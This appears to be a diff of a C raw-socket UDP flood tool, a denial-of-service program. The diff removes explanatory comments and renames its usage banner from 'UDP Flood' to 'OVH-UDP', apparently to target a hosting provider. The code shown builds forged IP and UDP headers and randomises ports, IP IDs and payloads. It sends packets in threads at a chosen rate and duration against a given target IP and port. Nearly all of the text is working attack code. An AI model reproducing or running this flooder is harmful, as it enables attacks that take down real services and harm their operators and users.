@@ -114,7 +114,7 @@ void setup_udp_header(struct udphdr *udpHeader)
 {
     udpHeader->source = htons(rand() & 0xFFFF);
     udpHeader->dest = htons(floodPort);
-    udpHeader->len = htons(8); // Minimum UDP header length
+    udpHeader->len = htons(8);
     udpHeader->check = 0;
 }
 
@@ -135,7 +135,7 @@ void *flood(void *par1)
 
     if (s < 0)
     {
-        fprintf(stderr, "Could not open raw socket.\n");
+        fprintf(stderr, "Could not open raw socket\n");
         exit(-1);
     }
 
@@ -147,22 +147,20 @@ void *flood(void *par1)
     ipHeader->id = htons(54321);
     ipHeader->frag_off = 0;
     ipHeader->ttl = 111;
-    ipHeader->protocol = 17; // UDP
+    ipHeader->protocol = 17;
     ipHeader->check = 0;
     ipHeader->saddr = util_external_addr();
     ipHeader->daddr = sin.sin_addr.s_addr;
 
     udpHeader->source = htons(rand() & 0xFFFF);
     udpHeader->dest = htons(floodPort);
-    udpHeader->check = 0; // Important: set to 0 before calculating checksum
+    udpHeader->check = 0;
     int data_len = rand() % (120 - 90 + 1) + 90;
 
-	// Point 'data' to the beginning of the UDP payload area.
 	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
 
-	// Fill the UDP payload with random data.
 	for (int i = 0; i < data_len; i++) {
-		data[i] = rand() % 256; // Generate a random byte
+		data[i] = rand() % 256;
 	}
 	
 	udpHeader->len = htons(sizeof(struct udphdr) + data_len);
@@ -194,19 +192,17 @@ void *flood(void *par1)
         }
         i++;
 
-        // Re-randomize some values for the next packet
-        udpHeader->source = htons(rand() & 0xFFFF); // randomize source port
+        udpHeader->source = htons(rand() & 0xFFFF);
 		data_len = rand() % (120 - 90 + 1) + 90;
 
-		// Refill the UDP payload with new random data.
 		data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
 		for (int j = 0; j < data_len; j++) {
-			data[j] = rand() % 256; // Generate a random byte
+			data[j] = rand() % 256;
 		}
 
 		udpHeader->len = htons(sizeof(struct udphdr) + data_len);
         ipHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
-        ipHeader->id = htons(rand_cmwc() & 0xFFFF); // randomize IP ID
+        ipHeader->id = htons(rand_cmwc() & 0xFFFF);
 		ipHeader->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
     }
     return NULL;
@@ -216,7 +212,7 @@ int main(int argc, char *argv[])
 {
     if (argc < 6)
     {
-        fprintf(stdout, "UDP Flood\nUsage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
+        fprintf(stdout, "OVH-UDP\n%s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
         exit(-1);
     }
 
@@ -241,7 +237,7 @@ int main(int argc, char *argv[])
     for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
     {
         usleep((1000 / multiplier) * 1000);
-        if (maxPacketsPerSecond != -1) // Check if there is a limit
+        if (maxPacketsPerSecond != -1)
         {
             if ((packetsPerSecond * multiplier) > maxPacketsPerSecond)
             {
